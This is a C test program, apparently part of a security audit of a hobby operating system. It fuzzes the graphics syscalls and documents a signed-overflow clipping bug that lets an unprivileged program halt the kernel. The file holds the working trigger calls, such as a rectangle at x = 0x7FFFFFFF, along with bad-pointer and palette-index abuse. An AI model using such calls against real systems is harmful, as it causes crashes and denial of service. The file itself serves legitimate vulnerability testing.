/* atk_gfx.c -- attack vector: the 24bpp drawing surface and the display
 * front-end (SYS_DISPLAY_MODE / SYS_GFX_RECT / SYS_GFX_BLIT / SYS_SET_PALETTE).
 *
 * WHY IT MIGHT CRASH  <- the strongest candidate in the whole audit
 *   SYS_GFX_RECT (src/task.c:1752) copies the caller's descriptor and
 *   checks ONLY the dimensions:
 *       if (r.w <= 0 || r.h <= 0 || r.w > GFX24_W || r.h > GFX24_H) EINVAL
 *   x and y are passed straight to gfx24_rect() -> fill() -> clip():
 *       if (*x < 0) { *w += *x; *x = 0; }
 *       if (*x + *w > GFX24_W) *w = GFX24_W - *x;      <-- signed overflow
 *   With x = 0x7FFFFFFF, w = 1 the test becomes 0x80000000 > 800 (false),
 *   so nothing is clipped and put/fill computes
 *       lfb + y*pitch + (uint32_t)x*stride      (~2 GB past the LFB)
 *   which is an unmapped address: the volatile store faults IN RING0, the
 *   exception dispatcher prints "ring0 kernel fault - system halted" and
 *   cli/hlt's forever.  Same for y = 0x7FFFFFFF.  That is a one-call
 *   kernel halt from an unprivileged program (needs gfx24 mode active,
 *   which any CE can request with display_mode(3)).
 *
 * Steps print before every call, so the surviving STEP on the frozen
 * screen names the killer.
 */
#include "atk_common.h"

catos_api_t *__ce_api __attribute__((section(".ce_api"))) = (catos_api_t *)0;

static gfx_rect_t R;
static gfx_blit_t B;
static uint8_t px[2400];

__attribute__((section(".text.ce_entry")))
int ce_main(int argc, char **argv) {
    catos_api_t *api = A();
    int i;
    (void)argc; (void)argv;

    w("ATK-GFX: display/gfx24 surface abuse\n");

    step(1); mark("mode/back-end discovery\n");
    m("mode(-1)", api->display_mode(-1));
    m("info mode", api->display_info(0));
    m("rect-in-text", api->gfx_rect(0));
    m("info-active", api->gfx_info(GFX_INFO_ACTIVE));
    nl();

    step(2); mark("display_mode(0x7FFFFFFF/4/-2) must be EINVAL\n");
    m("d(INT_MAX)", api->display_mode(0x7FFFFFFF));
    m("d(4)", api->display_mode(4));
    m("d(-2)", api->display_mode(-2));
    nl();

    step(3); mark("switch to 24bpp: display_mode(3)\n");
    m("d(3)", api->display_mode(3));
    m("active", api->gfx_info(GFX_INFO_ACTIVE));
    m("w", api->gfx_info(GFX_INFO_WIDTH));
    m("h", api->gfx_info(GFX_INFO_HEIGHT));
    m("stride", api->gfx_info(GFX_INFO_STRIDE));
    nl();
    if (!api->gfx_info(GFX_INFO_ACTIVE)) {
        w("gfx24 not active -- VBE unavailable in this guest; aborting\n");
        w("\nATK-DONE\n");
        return 0;
    }

    step(4); mark("benign rect (control: drawing works)\n");
    R.x = 8; R.y = 8; R.w = 16; R.h = 16; R.rgb = 0x00FF00u;
    m("rect", api->gfx_rect(&R));
    nl();

    /* Payload "h": decide whether the blit path can be made to overflow.
     * SYS_GFX_BLIT rejects w>GFX24_W / h>GFX24_H, and rowbytes = w*3 is
     * computed per row with w <= 800, so w*h*3 never materialises.  Both
     * ISOs must answer -22 here (Hunk 7 is then unnecessary). */
    if (argc >= 2 && argv[1][0] == 'h') {
        step(90); mark("PAYLOAD h: gfx_blit with huge h / w\n");
        for (i = 0; i < 2400; i++) px[i] = (uint8_t)i;
        B.src = px; B.x = 0; B.y = 0; B.w = 1; B.h = 0x40000000;
        m("blit w=1 h=0x40000000", api->gfx_blit(&B));
        B.w = 0x400; B.h = 0x40000000;
        m("blit w=1024 h=0x40000000", api->gfx_blit(&B));
        B.w = 0x7FFFFFFF; B.h = 2;
        m("blit w=INT_MAX h=2", api->gfx_blit(&B));
        B.w = 0x400; B.h = 0x258; B.x = 0x7FFFFFFF; B.y = 0x7FFFFFFF;
        m("blit legal size, x/y=INT_MAX", api->gfx_blit(&B));
        nl();
        w("\nATK-DONE\n");
        return 0;
    }

    step(5); mark("NEGATIVE x with w > |x|\n");
    R.x = -0x7FFFFFF0; R.y = 0; R.w = 0x800; R.h = 1; R.rgb = 0xFF0000u;
    m("rect", api->gfx_rect(&R));
    nl();

    step(6); mark("OVERFLOW: x = 0x7FFFFFFF, w = 1, h = 1  <<< KILLER\n");
    R.x = 0x7FFFFFFF; R.y = 0; R.w = 1; R.h = 1; R.rgb = 0xFF00FFu;
    m("rect", api->gfx_rect(&R));
    nl();
    w("survived x-overflow\n");

    step(7); mark("OVERFLOW: y = 0x7FFFFFFF, w = 1, h = 1\n");
    R.x = 0; R.y = 0x7FFFFFFF; R.w = 1; R.h = 1; R.rgb = 0xFF00FFu;
    m("rect", api->gfx_rect(&R));
    nl();
    w("survived y-overflow\n");

    step(8); mark("OVERFLOW combined: x=y=0x40000001, w=h=0x7FFFFFFF-ish\n");
    R.x = 0x40000001; R.y = 0x40000001; R.w = 0x400; R.h = 0x258;
    R.rgb = 0x00FFFFu;
    m("rect", api->gfx_rect(&R));
    nl();

    step(9); mark("blit descriptor abuse\n");
    for (i = 0; i < 2400; i++) px[i] = (uint8_t)i;
    B.src = px; B.x = 0; B.y = 600; B.w = 800; B.h = 1;
    m("blit-offscreen-y", api->gfx_blit(&B));
    B.x = 0x7FFFFFFF; B.y = 0; B.w = 1; B.h = 1;
    m("blit-x-INT_MAX", api->gfx_blit(&B));
    B.x = 0; B.y = 0x7FFFFFFF; B.w = 1; B.h = 1;
    m("blit-y-INT_MAX", api->gfx_blit(&B));
    B.src = (const uint8_t *)0xFFFFFFFFu; B.x = 0; B.y = 0; B.w = 1; B.h = 1;
    m("blit-src-max", api->gfx_blit(&B));
    B.src = (const uint8_t *)0x000B8000u;
    m("blit-src-vram", api->gfx_blit(&B));
    B.src = px; B.x = 0; B.y = 0; B.w = 800; B.h = 600;   /* 1.4 MB expected */
    m("blit-huge-from-2.4K", api->gfx_blit(&B));
    B.src = px; B.x = 0; B.y = 0; B.w = 0; B.h = 0;
    m("blit-zero", api->gfx_blit(&B));
    B.src = px; B.x = 0; B.y = 0; B.w = -800; B.h = -600;
    m("blit-negative", api->gfx_blit(&B));
    m("blit-null", api->gfx_blit(0));
    nl();

    step(10); mark("palette index abuse (CLUT is 256 entries)\n");
    {
        static const int IDX[] = { -1, 0, 255, 256, 0x7FFFFFFF, (int)0x80000000,
                                   (int)0xFFFFFFFF };
        for (i = 0; i < (int)(sizeof(IDX) / sizeof(IDX[0])); i++) {
            m("set", IDX[i]);
            mh("rgb", (uint32_t)api->palette(IDX[i]));
            wd(api->set_palette(IDX[i], 0x00ABCDEFu));
            w(" ");
        }
        nl();
    }

    step(11); mark("display_mode(1) 8bpp gfx, then rect (inactive?)\n");
    m("d(1)", api->display_mode(1));
    m("active", api->gfx_info(GFX_INFO_ACTIVE));
    R.x = 0; R.y = 0; R.w = 1; R.h = 1;
    m("rect", api->gfx_rect(&R));
    nl();

    step(12); mark("display_mode(3) again, then display_mode(0): CONSENT\n");
    m("d(3)", api->display_mode(3));
    m("d(0)", api->display_mode(0));       /* blocks on a physical keypress */
    w("consent answered\n");

    step(13); mark("display_info fuzz\n");
    {
        static const int W[] = { -1, 0, 99, 0x7FFFFFFF };
        for (i = 0; i < 4; i++) { m("di", W[i]); wd(api->display_info(W[i])); w(" "); }
        nl();
        for (i = 0; i < 4; i++) { m("gi", W[i]); wd(api->gfx_info(W[i])); w(" "); }
        nl();
    }

    w("\nATK-DONE\n");
    return 0;
}
